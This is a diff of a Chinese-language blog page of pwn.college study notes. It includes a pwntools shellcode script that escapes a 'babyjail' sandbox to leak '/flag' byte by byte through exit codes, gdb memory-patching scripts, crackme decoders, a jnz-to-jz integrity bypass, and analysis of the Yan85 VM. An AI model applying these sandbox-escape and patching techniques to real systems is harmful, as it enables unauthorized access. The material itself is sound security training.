@@ -25,8 +25,10 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220117165401525.png">
 <meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/photo_2018-01-13_11-28-32.jpg">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220426223702228.png">
+<meta property="og:image" content="https://yogdzewa.github.io/image/pwn-modules/image-20220430102917561.png">
 <meta property="article:published_time" content="2022-01-16T14:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-11T09:00:18.524Z">
+<meta property="article:modified_time" content="2022-04-30T15:55:24.904Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
@@ -212,7 +214,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      43k 字
+      56k 字
     </span>
   
 
@@ -221,7 +223,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      536 分钟
+      697 分钟
     </span>
   
 
@@ -262,7 +264,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年4月11日 下午
+                  不可视境界线最后变动于：2022年4月30日 晚上
                 
               </p>
             
@@ -1078,7 +1080,7 @@
 <figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/babyjail_level10&quot;</span><br>context.binary = binary<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    shellcode =  <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100&#x27;</span><br>    shellcode += shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>    shellcode += <span class="hljs-string">&#x27;mov r10, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\n&#x27;</span><br>    shellcode += shellcraft.amd64.exit(<span class="hljs-string">&#x27;r10&#x27;</span>)<br>    payload = asm(shellcode)<br>    p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>    p.sendline(payload)<br>    exitCode = p.poll(<span class="hljs-number">1</span>)                                   <br>    ans += <span class="hljs-built_in">chr</span>(exitCode)<br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure>
 
 <h3 id="11-nanosleep"><a href="#11-nanosleep" class="headerlink" title="11.nanosleep"></a>11.nanosleep</h3><blockquote>
-<p>这下子真的是1bit1bit的收集数据了</p>
+<p>这下子真的是bitwise的收集数据了</p>
 </blockquote>
 <p>遇到的几个问题:</p>
 <ul>
@@ -1154,7 +1156,7 @@
 <li>还把==写成=, 绝</li>
 <li>还发现了一个, 第六行按理来说已经跳到别的函数了, 毕竟read也只是glibc的封装, 但没注意到的是<code>__GI___libc_read()</code>这个函数根本没有<code>push rbp</code>,  <strong>所以当前栈帧没有变化</strong>.</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">r &lt;tmp<br>catch syscall read<br>commands<br>    silent<br>    if($rdi &gt;= 3)<br>        set *(int64_t*)($rbp-0x18) = 0x010203 # set ptr type<br>    end<br>    c<br>end<br><br>b *main+630 # stop at scanf()<br>commands<br>    silent<br>    set *(int64_t*)($rbp-0x10) = 0x010203<br>    c<br>end<br>c<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">r &lt;tmp<br>catch syscall read<br>commands<br>    silent<br>    if($rdi &gt;= 3 &amp;&amp; $rdi != 0x44)<br>        set *(int64_t*)($rbp-0x18) = 0x010203 # set ptr type<br>    end<br>    c<br>end<br><br>b *main+630 # stop at scanf()<br>commands<br>    silent<br>    set *(int64_t*)($rbp-0x10) = 0x010203<br>    c<br>end<br>c<br></code></pre></div></td></tr></table></figure>
 
 <p>一个level能挣这么多东西出来…….</p>
 <h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>直接一个<code>call (void*)win()</code>就结束了….</p>
@@ -1163,10 +1165,10 @@
 <li><code>cpp du strip strings</code> commands.</li>
 <li>the most often we do is reversing the main modules.</li>
 <li><code>fomit-frame-pointer</code> </li>
-<li><a target="_blank" rel="noopener" href="https://cloud.binary.ninja/u/yogdzewa">https://cloud.binary.ninja/u/yogdzewa</a> 用这个或者直接IDA就行. 都有IDA pro了其他的就随便试试.反正视频里是不可能说用盗版的:laughing: </li>
+<li><a target="_blank" rel="noopener" href="https://cloud.binary.ninja/u/yogdzewa">cloud ninja</a> 用这个或者直接IDA就行. 都有IDA pro了其他的就随便试试.反正视频里是不可能说用盗版的:laughing: </li>
 <li>把另一个checksec链接成了secheck, 功能似乎更多一点.</li>
 <li>Open source:<ul>
-<li><strong>angr management:</strong> an academic binary analysis framework! (<a target="_blank" rel="noopener" href="https://github.com/angr/angr-management/releases">https://github.com/angr/angr-management/releases</a>) </li>
+<li><strong>angr management:</strong> an academic binary analysis framework! (<a target="_blank" rel="noopener" href="https://github.com/angr/angr-management/releases">github</a>) </li>
 <li><strong>ghidra:</strong> a reversing tool created by the National Security Agency (<a target="_blank" rel="noopener" href="https://ghidra-sre.org/">https://ghidra-sre.org/</a>) </li>
 <li><strong>cutter:</strong> a reversing tool created by the radare2 open source project (<a target="_blank" rel="noopener" href="https://cutter.re/">https://cutter.re/</a>) </li>
 </ul>
@@ -1177,11 +1179,281 @@
 <li>context可以直接用display命令在每次停下来的时候模拟.</li>
 </ul>
 </li>
-<li>Timeless Debugging ??</li>
+<li>Timeless Debugging<ul>
+<li><strong>gdb</strong> has built-in record-replay functionality (<a target="_blank" rel="noopener" href="https://sourceware.org/gdb/current/onlinedocs/gdb/Process-Record-and-Replay.html">doc</a>)</li>
+<li><strong>rr</strong> is a highly-performant record-replay engine (<a target="_blank" rel="noopener" href="https://github.com/mozilla/rr">github</a>) <a target="_blank" rel="noopener" href="https://github.com/rr-debugger/rr/wiki/Usage">doc</a> </li>
+<li><strong>qira</strong> is a timeless debugger made for reverse engineering (<a target="_blank" rel="noopener" href="https://qira.me/">https://qira.me/</a>) </li>
 </ul>
 </li>
 </ul>
+</li>
+</ul>
+<h3 id="level1-0-2-1"><a href="#level1-0-2-1" class="headerlink" title="level1.0-2.1"></a>level1.0-2.1</h3><p>没有什么特别, 但是2.1这个字符换位置的汇编值得注意:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movzx   eax, byte ptr [rbp+buf]<br>mov     byte ptr [rbp+var_10], al<br>movzx   eax, byte ptr [rbp+buf+1]<br>mov     byte ptr [rbp+var_10+1], al<br>movzx   eax, byte ptr [rbp+var_10+1]<br>mov     byte ptr [rbp+buf], al<br>movzx   eax, byte ptr [rbp+var_10]<br>mov     byte ptr [rbp+buf+1], al<br></code></pre></div></td></tr></table></figure>
 
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>合着每关还有提示这关用了什么……</p>
+<p>level3是reverse mangler.</p>
+<h3 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h3><ul>
+<li>IDA的汇编语法是使用的MASM(Microsoft Macro Assembler)的. <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/assembler/masm/directives-reference?view=msvc-170">这里</a>是一些directive. </li>
+<li>IDA使用的high-level IL是IDC, 一个C-like language. 像什么<code>LOBYTE</code>在手册中有</li>
+<li>一个<code>char buf[6]</code>被识别成了<code>int buf + int16_t v6</code>, 改一下buf的定义就成.</li>
+<li>看了看IDA的一些操作.</li>
+</ul>
+<p>由于<code>biltw</code>是按照字母顺序排列, 所以一通操作之后没有变化.</p>
+<h3 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h3><blockquote>
+<p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb2</code> </p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">0xFA</span>,<span class="hljs-number">0xF6</span>,<span class="hljs-number">0xEA</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xF1</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x^<span class="hljs-number">0x98</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>])<br><br>[<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>]<br></code></pre></div></td></tr></table></figure>
+
+<p>好像简单过头了…</p>
+<h3 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h3><blockquote>
+<p>reverse + sort + xor</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;8f 8e 8e 8e 8c 82 81 87 86 84 9f 9e 9e 9e 93&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br>list1 = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>)^<span class="hljs-number">0xeb</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br>list1.reverse()<br>res = <span class="hljs-string">&quot;&quot;</span>.join([x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list1])<br><span class="hljs-built_in">print</span>(res)<br></code></pre></div></td></tr></table></figure>
+
+<p>属于是python的练习使用</p>
+<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><blockquote>
+<p>真特么复杂….还有<strong>不可见字符</strong>只能整成byte写到文件里.</p>
+<p>好像挺简单, 但是又有点难(?</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;ff ff fe fc fb fb fb f7 f6 f6 f1 e7 e6 e1 e1 3c 3a 3a 38 37 32 32 20 2c 25 22 21 32 20&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>] = <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>]<br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment">#print(len(list))</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">27</span>,<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">list</span>[i] ^= <span class="hljs-number">0x95</span><br>    <span class="hljs-built_in">list</span>[i+<span class="hljs-number">1</span>] ^= <span class="hljs-number">0x56</span><br><span class="hljs-built_in">list</span>[<span class="hljs-number">28</span>] ^= <span class="hljs-number">0x95</span> <span class="hljs-comment">#奇数个.....</span><br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><br><br>byte = <span class="hljs-string">b&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]) <span class="hljs-comment">#什么需求直接谷歌比看文档快多了, 特别是这种简单语法......</span><br><span class="hljs-built_in">print</span>(byte)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/root/Desktop/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(byte)                                                                              <br></code></pre></div></td></tr></table></figure>
+
+<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>这合理吗? 就硬堆数量……</p>
+<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><blockquote>
+<p>噢, 有点东西, 完全看不出来发生了什么, 得反汇编看看.</p>
+<p>用的md5, 没有办法reverse, 但是可以修改代码内容. </p>
+</blockquote>
+<ul>
+<li>IDA 添加类型 在shift+f1的local types中添加. 也就是view中的open subviews. ctrl+1=quick view</li>
+<li>gdb 与 set-uid 程序 与 $base</li>
+<li>IDA number of operand.</li>
+</ul>
+<p>因为使用了<code>mprotect()</code>可以修改代码段, 所以直接找到jnz的地方改成jz. 也就是0x1f01处从75改成74.</p>
+<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>使用bin_pedding函数把main函数填充到了2xxx的相对地址处, 不过同上.</p>
+<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><blockquote>
+<p>IDA的rename选项在手册的Give Name to the Location章, 查了下LOCAL and PUBLIC伪指令</p>
+<p>我还得查下md5函数怎么用.</p>
+</blockquote>
+<p>直接把整个程序的每个部分进行一个hash, 所以修改其他地方无法通过验证. 而且只能修改2byte.</p>
+<p>没事了, 连着改两个jnz就行了.</p>
+<h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><blockquote>
+<p>开始Yan85</p>
+</blockquote>
+<ul>
+<li>LOAD segment 只是个没有名字的段, IDA默认整个名字上去. 可以在段介绍中看到pure data/code之类的.</li>
+<li>递归学习:<ul>
+<li>在IDA看到一个<code>text &quot;UTF-16LE&quot;, &#39;abcdsif&#39;</code>, 还以为七个字符是连在一起的. 结果发现UTF-16LE有特别的地方. 直接改成DATA就会出现\0间隔的字符.</li>
+<li>然后就去查16LE是什么. 其实就是UTF-16的little-endian版本. Byte-Order-Mark etc.</li>
+<li><strong>UTF-8优势在于ascii是1byte, 16优势在于非ascii是两字节, 32在于不用encoding and decoding</strong>.</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm"># memset的一种实现方法, store string from rax by addr in rdi and counter in rcx.<br>lea	rdx，[rbp+var_110]<br>mov	eax， 0<br>mov	ecx，20h ;<br>mov rdi,rdx<br>rep stosq<br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<p>Yan85: a1, a2, a3是arg no.</p>
+<ul>
+<li><p>在main函数中一个256字节的空间(char a1[256+7]), 后面跟着7byte用作七个寄存器的空间. 然后进入execute_program.</p>
+</li>
+<li><p>describe_register是将数字转换成一个字符, 总共有七个, 每个字符后面都有\0: <code>aNone           db &#39;NONE&#39;,0</code> </p>
+</li>
+<li><p>describe_* 后面的level可能会用到, 到时再说</p>
+</li>
+<li><p>write_register是将a2用作a1[256~262]的索引, 然后将a3写入数组中.</p>
+<p><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong>  </p>
+<p>**分别是 <code>8  4  64 32 16 2  1 </code> ** </p>
+</li>
+<li><p>write_memory被用在stm指令中</p>
+</li>
+</ul>
+<p>然后分析<strong>每个指令</strong>作用: (reg)表示标号对应的寄存器的值.</p>
+<ul>
+<li>imm 就是     <code>(reg)a2 = a3</code> 加载立即数.</li>
+<li>stm其实就是<code>mov [(reg)a2 + a1], a3</code> </li>
+<li>syscall(a1, a2, a3), 假设寄存器为<strong>r1 r2 ~ r6</strong>, 然后<strong>if a2 == …</strong> <ul>
+<li>8: open <code>fd = open(&amp;a1[r1], r2, r3); (reg)a3 = fd;</code> </li>
+<li>4: read <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = read(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li>
+<li>1: write <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = write(r1, &amp;a1[r2], v5)</code> 然后count写入reg a3</li>
+<li>16: sleep r1 secs, (reg)a3 = left_time</li>
+<li>0x20: <code>exit(r1)</code> </li>
+<li>else:  <code>exit( (reg)a3 )</code> </li>
+</ul>
+</li>
+</ul>
+<p>如果是12.1, 估计我写个gdb脚本会更方便我查看执行流程. 在每个函数入口处dumpargs, 然后打印出来. 12.0我就直接看看提示.</p>
+<p>woc, 12.1都没有函数名称的, 我还得重命名一下函数. </p>
+<p>看了前面的一点, 只要<code>printf &quot;\x94\x11\x3f\xb3&quot; &gt; input</code> 就行. 自动读取flag.</p>
+<h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><blockquote>
+<ul>
+<li>ldm: load from memory: <code>(reg)a2 = a1[(reg)a3]</code> </li>
+<li>cmp: 两个寄存器结果放在a1[262]里, 第五位作为标志位, <figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">小于 : 16  	第5位<br>大于 : 8		第4位<br>等于 : 4 		第3位<br>不等于: <span class="hljs-number">2</span>      第<span class="hljs-number">2</span>位<br>两个全为零:<span class="hljs-number">1</span>   第<span class="hljs-number">1</span>位<br></code></pre></div></td></tr></table></figure></li>
+<li><strong>寄存器 <code>r1 r2 r3 r4 r5 r6 r7</code></strong><br>**分别是 <code>16 64 1  4  8  32 2 </code> ** </li>
+</ul>
+</blockquote>
+<p>看视频看到了新方法.</p>
+<ul>
+<li>遇到了一个指令解析错误, 只能undefine<code>crash</code>函数, 然后把字节设置成指令 设置函数end 设置新函数.</li>
+<li>完全可以只用静态分析, 既然256字节空间之后跟着的是7个register, 那么可以定义一个结构体, 这样decompilerd result会更准确.</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> memory[<span class="hljs-number">256</span>];<br>  <span class="hljs-keyword">unsigned</span> __int8 r1;<br>  <span class="hljs-keyword">unsigned</span> __int8 r2;<br>  <span class="hljs-keyword">unsigned</span> __int8 r3;<br>  <span class="hljs-keyword">unsigned</span> __int8 r4;<br>  <span class="hljs-keyword">unsigned</span> __int8 r5;<br>  <span class="hljs-keyword">unsigned</span> __int8 r6;<br>  <span class="hljs-keyword">unsigned</span> __int8 r7;<br>&#125;;<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li>对于describe_register()函数来说可以定义一个enum变量, 就不用搁那翻译每个寄存器是对应哪个数字了.</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">REGISTER</span> :</span> __int8<br>&#123;<br>  r1 = <span class="hljs-number">0x1</span>,<br>  r3 = <span class="hljs-number">0x2</span>,<br>  r7 = <span class="hljs-number">0x4</span>,<br>  r4 = <span class="hljs-number">0x8</span>,<br>  r2 = <span class="hljs-number">0x10</span>,<br>  r6 = <span class="hljs-number">0x20</span>,<br>  r5 = <span class="hljs-number">0x40</span>,<br>&#125;;<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h3><blockquote>
+<p>emmmmm好像也没什么意义, 纯粹花时间看懂一个流程罢了. 只是复杂度的简单叠加, 把输入的每个bit进行一个加法操作.</p>
+</blockquote>
+<p>这题是0x81位置上先放九个数, 然后再分别加上一个数字, 然后, 就那样..</p>
+<h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>还是加上一个数, 勉强做一下. 果然是浪费时间.</p>
+<h3 id="level16-1"><a href="#level16-1" class="headerlink" title="level16.1"></a>level16.1</h3><blockquote>
+<p>开始Yan85 byte code. 直接从没有符号的版本入手开始占卜(</p>
+</blockquote>
+<p><del>IDA反编译出了问题, 实在是逆转前三个字节顺序的汇编代码太神奇, 一堆符号拓展 零拓展什么的.</del> 然后发现并没有问题.</p>
+<p>发现指令编码是这样一个结构:</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inst</span></span><br><span class="hljs-class">&#123;</span><br>  __int8 oprnd_1;<br>  __int8 opcode;<br>  __int8 oprnd_2;<br>  __int8 pedding; <span class="hljs-comment">//useless</span><br>&#125;;<br></code></pre></div></td></tr></table></figure>
+
+<p>在IDA中使用IDC编写脚本(gdb script也行, 也可以设置临时变量之类的).</p>
+<h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = SIL;<br><span class="hljs-keyword">auto</span> reg2 = (ESI &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>;<br><span class="hljs-keyword">auto</span> s1; <span class="hljs-keyword">auto</span> s2;<br><br><span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">1</span>) s1 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">16</span>) s1 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">4</span>) s1 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">64</span>) s1 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">32</span>) s1 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">8</span>) s1 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg1==<span class="hljs-number">2</span>) s1 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br><span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">1</span>) s2 = <span class="hljs-string">&quot;r1&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">16</span>) s2 = <span class="hljs-string">&quot;r2&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">4</span>) s2 = <span class="hljs-string">&quot;r3&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">64</span>) s2 = <span class="hljs-string">&quot;r4&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">32</span>) s2 = <span class="hljs-string">&quot;r5&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">8</span>) s2 = <span class="hljs-string">&quot;r6&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(reg2==<span class="hljs-number">2</span>) s2 = <span class="hljs-string">&quot;r7&quot;</span>;<br><br>msg(<span class="hljs-string">&quot;\tADD: %s = %s + %s\n&quot;</span>, s1, s1, s2);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>
+
+<h4 id="POP"><a href="#POP" class="headerlink" title="POP:"></a>POP:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> reg1 = (get_wide_dword(RBP<span class="hljs-number">-0x10</span>) &amp; <span class="hljs-number">0xff</span>);<br><span class="hljs-keyword">auto</span> s1;<br><br><span class="hljs-comment">//省略判断寄存器名称的部分代码</span><br><br>msg(<span class="hljs-string">&quot;\tPOP: %s=0x%x is %c, rsp=0x%x\n&quot;</span>, s1, RDX, RDX, RSI<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure>
+
